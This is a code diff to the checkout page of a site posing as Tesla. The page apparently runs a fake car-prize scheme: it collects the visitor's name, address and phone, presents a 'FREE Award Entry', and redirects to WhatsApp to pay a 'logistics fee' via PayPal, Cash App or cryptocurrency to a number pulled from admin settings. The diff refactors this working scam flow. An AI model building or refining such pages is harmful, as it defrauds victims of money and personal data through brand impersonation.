@@ -76,102 +76,115 @@
 
 <script src="js/config.js"></script>
 <script src="js/app.js"></script>
-<script src="js/vehicle-data.js"></script>
 <script>
-var sc = JSON.parse(localStorage.getItem('tesla_selected_car') || 'null');
-var sd = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
-var sm = JSON.parse(localStorage.getItem('tesla_delivery_method') || 'null');
-var st = localStorage.getItem('tesla_session_token') || getSession();
+(function() {
+  "use strict";
 
-if(!sc||!sd||!sm)window.location.href='dashboard.html';
-var PR='15814783495';
-(function(){var A=window.TESLA_API_BASE||'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';fetch(A+'/admin/settings').then(function(r){return r.json()}).then(function(d){if(d.paymentPhone){PR=d.paymentPhone.replace(/\D/g,'')}}).catch(function(){})})();
+  var S = 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/';
+  var V = {
+    cybertruck: { id:'cybertruck', name:'Cybertruck', price:'$71,985', img: S+'cybertruck-main.png' },
+    modely:     { id:'modely',     name:'Model Y',     price:'$41,380', img: S+'modely-main.png' },
+    models:     { id:'models',     name:'Model S',     price:'$111,380',img: S+'models-main.png' },
+    model3:     { id:'model3',     name:'Model 3',     price:'$38,380', img: S+'model3-main.png' },
+    modelx:     { id:'modelx',     name:'Model X',     price:'$116,380',img: S+'modelx-main.png' }
+  };
 
-document.getElementById('smModel').textContent=sc?'Tesla '+(sc.name||''):'—';
-document.getElementById('smMethod').textContent=sm?sm.name:'—';
-document.getElementById('smTime').textContent=sm?sm.days:'—';
-document.getElementById('smName').textContent=sd?(sd.fullName||'—'):'—';
-document.getElementById('smAddr').textContent=sd?(sd.address||'—'):'—';
-document.getElementById('smCity').textContent=sd?(sd.city||'—'):'—';
-document.getElementById('smCountry').textContent=sd?(sd.country||'—'):'—';
-document.getElementById('smPhone').textContent=sd?(sd.phone||'—'):'—';
-document.getElementById('smTotal').textContent=sm?sm.priceDisplay:'—';
-document.getElementById('carMiniName').textContent=sc?'Tesla '+(sc.name||''):'—';
-document.getElementById('carMiniPrice').textContent=sc?(sc.price||''):'—';
-var vi=VEHICLE_DATA?(VEHICLE_DATA[sc.id]||null):null;
-var im=document.getElementById('carMiniImg');
-if(vi&&vi.img)im.src=vi.img;else if(sc.img)im.src=sc.img;
-var sp=null;
-function selectPayment(m){sp=m;document.querySelectorAll('.pay-card').forEach(function(e){e.classList.remove('selected')});document.getElementById('pay-'+m).classList.add('selected');var b=document.getElementById('payBtn');b.disabled=false;b.style.opacity='1';b.style.cursor='pointer';b.textContent='🔒 Pay '+(sm?sm.priceDisplay:'')+' & Place Order'}
-function processPayment() {
-  if (!sp || !st) return;
-  showLoading('Processing your order...');
-  
-  var payMethodName = sp === 'paypal' ? 'PayPal' : sp === 'cashapp' ? 'Cash App' : 'Cryptocurrency';
-  
-  apiCall('/order', 'POST', {
-    sessionToken: st,
-    selectedCar: sc,
-    deliveryDetails: sd,
-    deliveryMethod: sm,
-    paymentMethod: { id: sp, name: payMethodName }
-  }).then(function(r) {
-    var ord = r.order || {};
-    localStorage.setItem('tesla_last_order', JSON.stringify(ord));
-    
-    // Generate a professional pre-filled WhatsApp message
-    var orderId = ord.orderId || 'N/A';
-    var trackingNum = ord.trackingNumber || 'N/A';
-    var name = ord.deliveryDetails && ord.deliveryDetails.fullName || 'N/A';
-    var model = ord.selectedCar && ord.selectedCar.name ? 'Tesla ' + ord.selectedCar.name : 'N/A';
-    var retailVal = ord.selectedCar && ord.selectedCar.price ? ord.selectedCar.price : 'N/A';
-    
-    var addr = ord.deliveryDetails ? [
-      ord.deliveryDetails.address,
-      ord.deliveryDetails.city,
-      ord.deliveryDetails.state,
-      ord.deliveryDetails.zipCode,
-      ord.deliveryDetails.country
-    ].filter(Boolean).join(', ') : 'N/A';
-    
-    var delivMethod = ord.deliveryMethod && ord.deliveryMethod.name ? ord.deliveryMethod.name : 'N/A';
-    var delivFee = ord.deliveryMethod && typeof ord.deliveryMethod.price !== 'undefined' ? '$' + ord.deliveryMethod.price : 'Pending';
-    var orderDate = ord.orderDate ? new Date(ord.orderDate).toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' }) : new Date().toLocaleString();
-    
-    var message = '*TESLA AWARD CONFIRMATION & PAYMENT DETAILS*
+  var sc = JSON.parse(localStorage.getItem('tesla_selected_car') || 'null');
+  var sd = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
+  var sm = JSON.parse(localStorage.getItem('tesla_delivery_method') || 'null');
+  var st = localStorage.getItem('tesla_session_token') || (typeof getSession === 'function' ? getSession() : '');
 
-' +
-      '• *Order ID:* ' + orderId + '
-' +
-      '• *Tracking Number:* ' + trackingNum + '
-' +
-      '• *Customer Name:* ' + name + '
-' +
-      '• *Tesla Model:* ' + model + '
-' +
-      '• *Retail Value:* ' + retailVal + ' (FREE Award Entry)
-' +
-      '• *Delivery Address:* ' + addr + '
-' +
-      '• *Delivery Method:* ' + delivMethod + ' (' + delivFee + ' Logistics Fee)
-' +
-      '• *Payment Method:* ' + payMethodName + '
-' +
-      '• *Order Date & Time:* ' + orderDate + '
-' +
-      '• *Total Logistics Fee Due:* ' + delivFee + '
+  if (!sc || !sd || !sm) { window.location.href = 'dashboard.html'; return; }
 
-' +
-      'Hi, I have successfully placed my order and would like to proceed with the payment confirmation of ' + delivFee + ' via ' + payMethodName + '. Please guide me with the secure checkout details.';
-      
-    hideLoading(function() {
-      window.location.href = 'https://wa.me/' + PR + '?text=' + encodeURIComponent(message);
+  var PR = '15814783495';
+  try {
+    var A = (typeof window !== 'undefined' && window.TESLA_API_BASE) || 'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';
+    fetch(A + '/admin/settings').then(function(r){ return r.json(); }).then(function(d){ if(d.paymentPhone) PR = d.paymentPhone.replace(/\D/g,''); }).catch(function(){});
+  } catch(_e) {}
+
+  document.getElementById('smModel').textContent = sc ? 'Tesla ' + (sc.name || '') : '—';
+  document.getElementById('smMethod').textContent = sm ? sm.name : '—';
+  document.getElementById('smTime').textContent = sm ? sm.days : '—';
+  document.getElementById('smName').textContent = sd ? (sd.fullName || '—') : '—';
+  document.getElementById('smAddr').textContent = sd ? (sd.address || '—') : '—';
+  document.getElementById('smCity').textContent = sd ? (sd.city || '—') : '—';
+  document.getElementById('smCountry').textContent = sd ? (sd.country || '—') : '—';
+  document.getElementById('smPhone').textContent = sd ? (sd.phone || '—') : '—';
+  document.getElementById('smTotal').textContent = sm ? sm.priceDisplay : '—';
+  document.getElementById('carMiniName').textContent = sc ? 'Tesla ' + (sc.name || '') : '—';
+  document.getElementById('carMiniPrice').textContent = sc ? (sc.price || '') : '—';
+
+  var vi = V[sc.id] || null;
+  var im = document.getElementById('carMiniImg');
+  if (vi && vi.img) { im.src = vi.img; im.style.display = ''; }
+  else if (sc.img) { im.src = sc.img; im.style.display = ''; }
+
+  var sp = null;
+
+  window.selectPayment = function(m) {
+    sp = m;
+    document.querySelectorAll('.pay-card').forEach(function(e) { e.classList.remove('selected'); });
+    document.getElementById('pay-' + m).classList.add('selected');
+    var b = document.getElementById('payBtn');
+    b.disabled = false;
+    b.style.opacity = '1';
+    b.style.cursor = 'pointer';
+    b.textContent = '🔒 Pay ' + (sm ? sm.priceDisplay : '') + ' & Place Order';
+  };
+
+  window.processPayment = function() {
+    if (!sp || !st) {
+      if (typeof showToast === 'function') showToast('Please select a payment method.', 'error');
+      return;
+    }
+    if (typeof showLoading === 'function') showLoading('Processing your order...');
+
+    var payMethodName = sp === 'paypal' ? 'PayPal' : sp === 'cashapp' ? 'Cash App' : 'Cryptocurrency';
+    var payload = { sessionToken: st, selectedCar: sc, deliveryDetails: sd, deliveryMethod: sm, paymentMethod: { id: sp, name: payMethodName } };
+
+    var doApiCall = (typeof apiCall === 'function') ? apiCall : function(e, m, b) {
+      m = m || 'POST';
+      var B = (typeof window !== 'undefined' && window.TESLA_API_BASE) || 'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';
+      return fetch(B + e, { method: m, headers: { 'Content-Type': 'application/json' }, body: b ? JSON.stringify(b) : null }).then(function(r) {
+        var ct = r.headers.get('content-type') || '';
+        return (ct.includes('application/json') ? r.json() : r.text()).then(function(d) {
+          if (!r.ok) { var msg = typeof d === 'string' ? d : (d.error || d.message || 'Something went wrong.'); throw new Error(msg); }
+          return d;
+        });
+      });
+    };
+
+    doApiCall('/order', 'POST', payload).then(function(r) {
+      var ord = r.order || {};
+      localStorage.setItem('tesla_last_order', JSON.stringify(ord));
+      var oid = ord.orderId || 'N/A';
+      var trk = ord.trackingNumber || 'N/A';
+      var nm  = (ord.deliveryDetails && ord.deliveryDetails.fullName) || 'N/A';
+      var mdl = (ord.selectedCar && ord.selectedCar.name) ? 'Tesla ' + ord.selectedCar.name : 'N/A';
+      var adr = ord.deliveryDetails ? [ord.deliveryDetails.address, ord.deliveryDetails.city, ord.deliveryDetails.state, ord.deliveryDetails.zipCode, ord.deliveryDetails.country].filter(Boolean).join(', ') : 'N/A';
+      var dm  = (ord.deliveryMethod && ord.deliveryMethod.name) ? ord.deliveryMethod.name : 'N/A';
+      var fee = (ord.deliveryMethod && typeof ord.deliveryMethod.price !== 'undefined') ? '$' + ord.deliveryMethod.price : 'Pending';
+      var msg = '*TESLA AWARD CONFIRMATION & PAYMENT DETAILS*\n\n' +
+        '• *Order ID:* ' + oid + '\n' +
+        '• *Tracking Number:* ' + trk + '\n' +
+        '• *Customer Name:* ' + nm + '\n' +
+        '• *Tesla Model:* ' + mdl + '\n' +
+        '• *Delivery Address:* ' + adr + '\n' +
+        '• *Delivery Method:* ' + dm + ' (' + fee + ' Logistics Fee)\n' +
+        '• *Payment Method:* ' + payMethodName + '\n' +
+        '• *Total Logistics Fee Due:* ' + fee + '\n\n' +
+        'Hi, I have successfully placed my order and would like to proceed with the payment confirmation of ' + fee + ' via ' + payMethodName + '. Please guide me with the secure checkout details.';
+      if (typeof hideLoading === 'function') {
+        hideLoading(function() { window.location.href = 'https://wa.me/' + PR + '?text=' + encodeURIComponent(msg); });
+      } else {
+        window.location.href = 'https://wa.me/' + PR + '?text=' + encodeURIComponent(msg);
+      }
+    }).catch(function(e) {
+      if (typeof hideLoading === 'function') hideLoading();
+      if (typeof showToast === 'function') showToast(e.message || 'Order failed. Please try again.', 'error');
     });
-  }).catch(function(e) {
-    hideLoading();
-    showToast(e.message || 'Order failed. Please try again.', 'error');
-  });
-}
+  };
+})();
 </script>
 </body>
 <!-- build: 1784129877 -->
